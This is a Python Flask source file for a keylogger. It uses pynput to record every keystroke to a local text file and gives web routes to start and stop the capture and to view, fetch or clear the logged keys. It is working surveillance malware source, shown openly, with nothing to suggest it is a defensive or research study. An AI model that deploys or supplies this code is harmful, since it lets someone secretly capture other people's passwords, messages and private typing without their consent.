from flask import Flask, render_template, jsonify
import threading

app = Flask(__name__)

listener_thread = None
listener_instance = None
running = False


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/start")
def start():
    global listener_thread, running, listener_instance

    if running:
        return jsonify({"status": "error", "message": "Keylogger already running"})

    def keylogger_main():
        from pynput import keyboard
        
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = str(key)
            
            with open("keylogs.txt", 'a') as logs:
                logs.write(char + '\n')
        
        global listener_instance
        with keyboard.Listener(on_press=on_press) as listener:
            listener_instance = listener
            listener.join()
    
    listener_thread = threading.Thread(target=keylogger_main)
    listener_thread.daemon = True
    listener_thread.start()

    running = True
    return jsonify({"status": "success", "message": "Keylogger started successfully"})


@app.route("/stop")
def stop():
    global listener_thread, running, listener_instance

    if not running:
        return jsonify({"status": "error", "message": "Keylogger is not running"})

    if listener_instance:
        listener_instance.stop()
    
    running = False
    return jsonify({"status": "success", "message": "Keylogger stopped successfully"})


@app.route("/logs")
def logs():
    try:
        with open("keylogs.txt", "r") as f:
            data = f.read()
    except:
        data = "No logs found."

    return render_template("logs.html", logs_data=data)


@app.route("/logs_data")
def logs_data():
    """Return the current logs and a simple count as JSON."""
    try:
        with open("keylogs.txt", "r") as f:
            data = f.read()
    except FileNotFoundError:
        data = ""

    count = data.count("\n") if data else 0
    # normalize empty
    if not data:
        data = "No logs found."
    return jsonify({"logs": data, "count": count})


@app.route("/clear_logs", methods=["POST"])
def clear_logs():
    """Truncate the log file completely."""
    try:
        open("keylogs.txt", "w").close()
        message = "Logs cleared successfully"
        status = "success"
    except Exception as e:
        message = f"Failed to clear logs: {e}"
        status = "error"
    return jsonify({"status": status, "message": message})


if __name__ == "__main__":
    print("Server starting...")
    app.run(host="127.0.0.1", port=5000, debug=True)